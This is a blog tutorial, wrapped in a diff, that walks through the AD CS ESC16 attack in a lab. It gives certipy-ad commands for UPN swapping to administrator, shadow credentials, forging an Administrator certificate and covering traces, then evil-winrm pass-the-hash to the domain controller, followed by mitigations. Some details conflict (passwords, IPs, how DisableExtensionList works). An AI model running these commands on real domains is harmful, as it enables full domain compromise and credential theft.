@@ -1,0 +1,159 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC16 – Security Extension Disabled on CA (Globally)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/" rel="bookmark"><time class="entry-date published" datetime="2025-07-19T17:06:46+00:00">July 19, 2025</time><time class="updated" datetime="2025-07-19T17:10:07+00:00">July 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">The ESC16 vulnerability in AD CS allows attackers to bypass certificate validation and escalate privileges through misconfigured templates, UPN mapping, and shadow credentials. This can lead to full domain compromise. Immediate mitigation is critical to protect your Microsoft PKI and prevent unauthorized access.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Overview the ESC16 Attack</strong></span></li>
+<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+<li><span style="color: #000000;"><strong>Enumeration &amp; Exploitation </strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000;">Overview the ESC16 Attack</span></h3>
+<p><span style="color: #000000;"><strong>ESC16</strong> is a post-compromise attack technique in <strong>Active Directory Certificate Services (AD CS)</strong> that combines <strong>weak certificate extension controls</strong>, <strong>improper UPN handling</strong>, and <strong>shadow credentials</strong> to achieve full domain compromise.</span></p>
+<p><span style="color: #000000;">At its core, ESC16 abuses two main weaknesses:</span></p>
+<p><span style="color: #000000;"><strong>Misuse of the DisableExtensionList registry key</strong></span></p>
+<p><span style="color: #000000;">If improperly configured, this allows attackers to bypass restrictions on certificate extensions opening the door for shadow credentials or additional identity manipulations.</span></p>
+<p><span style="color: #000000;"><strong>Temporary UPN manipulation</strong></span></p>
+<p><span style="color: #000000;">By granting themselves write access to another account’s User Principal Name (UPN), attackers can impersonate privileged accounts (like Administrator) during certificate requests.</span></p>
+<p><span style="color: #000000;">When combined, these flaws let a low-privileged attacker:</span></p>
+<ul>
+<li><span style="color: #000000;">Request certificates that <strong>bypass extension restrictions</strong></span></li>
+<li><span style="color: #000000;">Map them to <strong>high-value accounts</strong></span></li>
+<li><span style="color: #000000;">Use shadow credentials for persistence</span></li>
+<li><span style="color: #000000;">Pivot to <strong>Domain Admin</strong> privileges without triggering traditional password/hashes detection</span></li>
+</ul>
+<h4><span style="color: #800000;">Why ESC16 is Dangerous</span></h4>
+<ul>
+<li><span style="color: #000000;">Exploits a <strong>registry-based hardening mistake</strong> (DisableExtensionList).</span></li>
+<li><span style="color: #000000;">Leverages <strong>attribute-level permissions</strong> (Write access to UPN).</span></li>
+<li><span style="color: #000000;">Enables <strong>stealthy persistence</strong> via shadow credentials.</span></li>
+<li><span style="color: #000000;">Works even in hardened environments with <strong>StrongCertificateBindingEnforcement</strong> enabled.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Result:</strong> A complete compromise of Active Directory with minimal touch points.</span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Prerequisite</span> </span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000;">Tools: Evil-Winrm, certipy-ad</span></li>
+</ul>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;">In this guide, we’re <strong>not walking through a full AD CS deployment</strong>. Instead, we assume a typical enterprise environment where:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Active Directory and AD CS are installed</strong></span></li>
+<li><span style="color: #000000;">Two domain users exist:</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>raj (attacker-controlled)</strong></span></p>
+<p><span style="color: #000000;"><strong>sanjeet (lower-privilege target)</strong></span></p>
+<ul>
+<li><span style="color: #000000;">The Certificate Authority (ignite-DC01-CA) is operational</span></li>
+</ul>
+<p><span style="color: #000000;">To begin with, our first step is verifying and tweaking settings in Active Directory and the CA to ensure the prerequisites for ESC16 are in place.</span></p>
+<h4><span style="color: #800000;">Inspect User Group Memberships</span></h4>
+<p><span style="color: #000000;">In <strong>Active Directory Users and Computers (ADUC):</strong></span></p>
+<p><span style="color: #000000;">Firstly, open <strong>raj → Properties → Member Of</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXj5HdFh1Lzo9f6eAWgIeSMXa-PWxqXON6qfEgVoB_jiJXfPLh9pDL4dtibRuApCAf4hnb4Magj3Es2DGyEf-Nr1Dc1U9Pt1WmD5mOAlArmrsPXplQKcwHOy8LvVe_Foy-bYGlVgggYPSg8r2VEIbK2x9jCXBjxdS3S5VaGrAOVf0-V1-fAW3L64Txzye4/s16000/1.1.png"/></span></p>
+<p><span style="color: #000000;">Then, open <strong>sanjeet → Properties → Member Of</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEPc7c5UotKX-JVUIKzRSh-dLry1vbo7qG-zYJDCkkffVkMx5Utrgwc3c_eNjr9CNe3O4IxB9PkIxd60k5Zm1w85j3kNoe3-6PR4ls8iBCrBmNnQDg_gNivmV8OVLZjDdqsg86PXvKeqjl4YM5q86DTDuNrPwQefvmo48U4zogxLWmLZKRzaq9xPnEZDzu/s16000/1.2.png"/></span></p>
+<p><span style="color: #000000;">Enumerate the privileges of both accounts and assess if sanjeet can be leveraged as a pivot point for privilege escalation.</span></p>
+<h4><span style="color: #800000;">Grant Write Permissions to raj on sanjeet</span></h4>
+<p><span style="color: #000000;">In ADUC:</span></p>
+<ol>
+<li><span style="color: #000000;">Firstly<strong>, open Sanjeet → Properties → Security → Advanced</strong></span></li>
+<li><span style="color: #000000;">Add raj</span></li>
+<li><span style="color: #000000;">Then, Grant <strong>Write permissions</strong></span></li>
+<li><span style="color: #000000;">Finally, Apply changes</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikJAB-5yX4hyphenhyphenP2s_k1nN8FDppWvGdXghnMxuw5eYBdPPx9oMvabijOyp7bpOHkYMgtcfiSZubRNDiv-z6V1lm4t06ULylW7l14NGJoHNriFJEwzwxDbknK16DBdCdCOVd5NK54GkvaHkLxPqTfn5W-sO_epCtz8uU98Z0XCPfW406pGiSQR00fsJYBCghe/s16000/1.3.png"/></span></p>
+<p><span style="color: #000000;">This permission enables raj to modify sensitive attributes of sanjeet (such as the UPN), which is a crucial prerequisite for subsequent privilege escalation steps.</span></p>
+<h4><span style="color: #800000;">Adjust KDC and CA Registry Settings</span></h4>
+<p><span style="color: #000000;">For the ESC16 attack to succeed, certain KDC and CA registry settings must be misconfigured or overly permissive. This step involves auditing these settings to identify or exploit weaknesses that allow certificate requests with elevated privileges (e.g., using another user’s SID or UPN).</span></p>
+<p><span style="color: #000000;">Key focus areas:</span></p>
+<ul>
+<li><span style="color: #000000;">KDC settings like AllowAltSecurityIdentities</span></li>
+<li><span style="color: #000000;">CA template handling of SubjectAltName fields and EKUs</span></li>
+<li><span style="color: #000000;">Use of tools like reg query or PowerShell for enumeration</span></li>
+</ul>
+<p><span style="color: #000000;">Improper settings here can allow low-privileged users to impersonate high privilege accounts via certificate based authentication.</span></p>
+<h4><span style="color: #800000;">Enable Strong Certificate Binding Enforcement</span></h4>
+<p><span style="color: #000000;">Setting the StrongCertificateBindingEnforcement DWORD registry key activates this strict validation, which is a common hardening measure in enterprise environments focused on securing PKI and Kerberos authentication.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhasOsPiKSDCxqHCw-O7oZIWX2kR6eHqwDWzhqA11xiZEs3uhoTuXBrbzA9N9SZEdh997I_YVupC-5eDA244DgXj5n2sudVWTvPNzbjDom7_2Zxl45HXiMTHg6bvGkn-L6SstRkX6clpQ-MfJNb0RWQVHH5DwFXgmnI7_6P_RJQVQsaV78JD_8SAT9831js/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">This simulates a scenario where strong binding is enforced, which is common in hardened enterprise environments. Verification can be done using the following command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5AH8452TvZOPGUgLfzhZXGRp1Zyvj4GBLFt2H-MEpd_8nVXF93Zsg-X7ra6-YPgVn6YUvXxyV67hlzPiquIXY7dyd4jtHOAsVVIndIRBx2m48lK588DM1W9nBs4ElLP4jfknFBF_Zq-INBU2a4swbNTKfQl277T1mP1WP4PobQG8ipshbDiJw62O3Cfnt/s16000/2.1.png"/></span></p>
+<h4><span style="color: #800000;">Modify CA DisableExtensionList</span></h4>
+<p><span style="color: #000000;">Modifying the DisableExtensionList registry setting on the Certificate Authority removes certain extensions from the blacklist, allowing critical certificate extensions such as those used for shadow credentials to be accepted.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.25.2</pre>
+<p><span style="color: #000000;">The command adds the extension 1.3.6.1.4.1.311.25.2 to the CA’s allowed list, letting certificates with this extension be issued, enabling techniques like shadow credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTMIE462GX62HdIG0fsjQXi2_iYo9U8jb3Js0eKhFnyTz0bZAJ5Dbtf_rt5HLtwrwy2MSNvi01Om-lZnG_YLpiSUukv4YKmticLJPmZ7dM890kyrRqCK0RBJ_88rvH0TYkIGN9FKe5ckpurj-zB3StasC7WNBzETfBWBWnI0fb9GC22U52r4MMgc7ZbFvr/s16000/2.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -getreg policy\DisableExtensionList</pre>
+<p><span style="color: #000000;">This retrieves the current list of certificate extensions that the CA blocks or allows, showing which extensions are disabled or permitted.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJ-lbYWBueV2ARr_ufacIz7HhkGIDYKjhOewkNqD3AgA6QDRJ-gc3nrhlM0DvS3hzjLtW2_wB4xI8b2Z9G_-f6-WgwTs8y99LZo-2S0Z-25tVpxexLzCdwoyAJxtGGd1OJ2cu2b1e682XN4dHpiNR6HfZhhgX3OQMm5jhzkMJOtR2AAXFVHFSNXeo-uKUj/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">After modifying Certificate Authority (CA) registry settings, such as updating the DisableExtensionList, it’s necessary to restart the Certificate Services (certsvc) to apply the changes. Restarting ensures that the CA loads the updated configuration, allowing new certificate issuance policies or extensions to take effect immediately without requiring a system reboot.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net stop certsvc
+net start certsvc</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim4w6ZkfJQ95faEQ1roZ4YK-8XD3KfXvR3NUlVbFvaG_FFyfvfZxwdcI-rwwS884Kog9m5dCTQijVBR3fmaMlbNEtUp-her1S2dekEWMTkt1iKyzdtCvY2O0T76gLLqiOrQ56lQ307DOAJgGujW9jNxbfyuatTK_KAatMBAQvSMGMll2EaR_lhRRpAMwIz/s16000/4.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration &amp; Exploitation</span> </span></h3>
+<h4><span style="color: #800000;">Enumerate Vulnerable Templates</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u raj -p Passworda1 -dc-ip 192.168.220.138 -vulnerable -stdout</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinS2_kUkvLEwR9-M0-P1L1Y_2OtCTJ6wJRk7hfKKU2ikyS-yU8qpSak8goqzGVTaTBWjW_1xuCqHVvV_b7xLxZMhjbave9SQumbnmLaz_zOEOpl3ziqNEHtYz_sTVzaKB4iEj5tzH5iYxC6zXoW_LJwpKrul6TVkWDGyjIlDnHzPd2BjmlIQJPD8x2mz-5/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">This enumerates the certificate templates available to us and identifies any potentially risky configurations as</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhD2j4KvYJHqL-JSMhS2ym3K1jBMCkVnu5mymsrlIqogt2Dzz2e6GB63OXd4Esx6w0ERG88vtQOZE1JoLi1q4KLsGHkuRmWoqIRjHeT55ck96R3WKxk0ltUo-Yn09aZFXP4oljfmx0943FD0TjettkvR5g9snwUGBfTCxbpEX16Y4YFlQNX5xrCmg-p_88e/s16000/6.png"/></span></p>
+<h4><span style="color: #800000;">Read sanjeet Account Attributes</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u raj -p Password@1 -dc-ip 192.168.220.138 -user sanjeet read</pre>
+<p><span style="color: #000000;">This verifies that sanjeet can be queried and checks for any writable permissions on their account.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6DD3JvjqwuO9buRWdpQWLW1GmNy14hLhhL6Q1XPBvrRS3_jVJceFlC55UMFx7ANG7AtW5kM4R52EBYDmZYTr3_l82FFnEstEhn1yW6bIUjcbFRxxiLjloVXHxqdhVlRTsPTGqn4CYzWhfs8TwOLBPbpCvIC5mhAmFpxmKSYu_XzBjz82-Q3RWuzSLc3wV/s16000/7.png"/></span></p>
+<h4><span style="color: #800000;">Change Sanjeet’s UPN to Administrator</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u raj -p Password@1 -dc-ip 192.168.220.138 -upn administrator -user sanjeet update</pre>
+<p><span style="color: #000000;">This temporarily maps sanjeet to administrator@ignite.local, allowing the CA to be tricked into issuing certificates as the Administrator account.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJijcg-ymS95dCqBA3gK5eedzwYM4Q40NV0wuM79_NPrBP54ndKxZsaIxdE63SfDhScjJKowAXuo3oRhyJFMJpY-036NgsCJhOaQgvZbM6aKFbiDG1DMn0vFJkR2npGQkR4Qcec4ym76sf3ygynMG6y-T-JPZcyHuN9OonsbaRY2oA-AujCQYehn4OJQTN/s16000/8.png"/></span></p>
+<h4><span style="color: #800000;">Set Up Shadow Credentials for sanjeet</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.220.138 -account sanjeet auto</pre>
+<p><span style="color: #000000;"> This generates alternate logon credentials for sanjeet, enabling covert access for future use.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4F93UK5AIbAa93AUZUydLgJMS-gQKYgzOpXaej5MVBwnenppWn8_oJ2sFKbcfttGk5pgLNuhB06dDyUSFMlW37MLqxYTcOM7_o-YBduWoJa_jbu4TPnpHLnc7UIPj7_BFaZFUSUVlALGAzu33GNa9yYdCgmjZtLA5f42rjkBwfMBX4gJ6rF6sWaHikQKi/s16000/9.png"/></span></p>
+<h4><span style="color: #800000;">Request Certificate as Administrator</span></h4>
+<p><span style="color: #000000;">Export the user’s Kerberos tickets for reuse on another system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=sanjeet.ccache
+certipy-ad req -k -dc-ip 192.168.220.138 -ca 'ignite-DC01-CA' -template 'User' -target dc01.ignite.local</pre>
+<p><span style="color: #000000;">This action uses Sanjeet’s UPN mapped to Administrator to request a certificate, granting admin level access that can be reused without re-authentication, ideal for stealthy persistence or lateral movement.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOQYYxTN0T91mdu3A0BdXJs8smX9RONeoHZpviL1d11fBuGnSY07Mc9jec5cTQN8cBHeHqzLGJA0-yXaIOh7PUCSc8FrnkiM-pu6Mv_gAuNvaVm3DqATmvAthR8MhA5k1oc6k-fgTFoSDldhSf7C9BRUIiGtvVO_Szorw9V1nuDQlYx2maDlCJH-PxhETS/s16000/10.png"/></span></p>
+<h4><span style="color: #800000;">Restore Sanjeets’s Original UPN</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u raj -p Password@1 -dc-ip 192.168.220.138 -upn sanjeet@ignite.local -user 'sanjeet' update</pre>
+<p><span style="color: #000000;">This removes traces by restoring sanjeet’s original UPN.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_LIUueIgLc3MzCmDlwyo9gswCUymHAYlpq9omdEmnAZ58BzZ5S708hatT28RL4D45Yuyd7obFKlGbOiZnJ1-iZdYddXo_wID7NK_NBYaWGxsAgohNrXXlaNSpMOiT71IrBpngmsOftImEga4a-3r9hdVVERGavws8qCBZN77UypK0acpdSUpHhu0Epdpk/s16000/11.png"/></span></p>
+<h4><span style="color: #800000;">Verify Changes</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account  -u raj -p Password@1 -dc-ip 192.168.220.138 -user sanjeet read</pre>
+<p><span style="color: #000000;">This confirms that the system has fully restored Sanjeet’s UPN and other modified attributes.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7hSgKqL9C3I6EOkrIKTgKpisUrflORdgXDWlV3jFMME0GpamalRZmgiUMIO2vhB8YU0iGmRUi7_GEaRKRD9EP-2tyXw7vC86Uglim3_Y4E12jT2zwWQyYrGlisYYE9Jv96ZkzFN_7Qlh_wyAR0ZbGhqCI44GhGiSvsDGgh4BO5F778th7tuH44gJxp7In/s16000/12.png"/></span></p>
+<h3><span style="color: #800000;">Authenticate as Administrator</span></h3>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -dc-ip 192.168.220.138 -pfx administrator.pfx -username administrator -domain 'ignite.local'</pre>
+<p><span style="color: #000000;">This leverages the forged Administrator certificate to gain full domain admin access.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQ8Tol4qAui3GaFSLTpcj81RtgSv7Seh_gvGjcABKZRMSr1Jta4VZMHKJzbUFwggCjUWjwd136KcaW2y6XXL2YfT-BUHwKuZ_qxjvv1fwFkkj1-kLx2gV8ipDu6bY9-JH8TMafHjXdI9XHmlHQdQYQq-a_YFlIaP4gaY1G74pCnHNCMyJjkwjKCdM61Sxw/s16000/13.png"/></span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<h4><span style="color: #800000;">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.16 -u administrator -H 64fbae31cc352fc26af97cbdef151e03</pre>
+<p><span style="color: #000000;">We Use Evil-WinRM with the stolen NTLM hash to access the Domain Controller as Administrator, confirming full domain compromise and enabling high level control.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdjYHX4zVgfm-JLihvhIUPB_sFGYrRGJmzkWY005meiK4v3zqRwYf8NZ2y_mC4ukEiPb3x6otNCHyRjKBYu1Sv3W4m0yE-Vz3BBnVXZymAM_VpS6t17m57WdBjlmYWEnpyTJXsZcFEknA47FtxBn46Aii4EvQSNjmH0WgWnqF_X3Y8xeAX_mchKhU1LKIb/s16000/14.png"/></span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;">Firstly, restrict <strong>write access on other users’ attributes.</strong></span></li>
+<li><span style="color: #000000;">Additionally, enforce<strong> strict monitoring on UPN changes (Event ID 4739)</strong></span></li>
+<li><span style="color: #000000;">Instead of overusing <strong>DisableExtensionList</strong>, prefer deny-listing risky extensions manually</span></li>
+<li><span style="color: #000000;">Moreover, monitor shadow credential creation (Event ID 5136)</span></li>
+<li><span style="color: #000000;">Lastly, patch AD CS to close UPN &amp; extension bypass vectors (ESC16 mitigation updates, 2025)</span></li>
+</ul>
+<p><span style="color: #000000;">Want to dive deep into ADCS attacks? Hit this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/category/active-directory-certificate-attack/">link</a></strong></span>.</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
